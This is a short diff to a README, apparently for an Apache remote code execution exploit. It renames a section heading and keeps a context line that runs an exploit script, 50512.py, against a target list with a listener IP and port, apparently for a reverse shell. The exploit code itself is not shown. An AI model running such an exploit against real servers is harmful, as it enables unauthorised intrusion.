@@ -32,7 +32,7 @@ python3 50512.py target.txt -ip 10.0.2.15 -p 4444
 ```
 ![apache](png/py.jpg)
 
-### Remote Code Execution:
+### check the version of Apache and run exploit:
 
 ![apache](png/RunExploit.jpg)
 
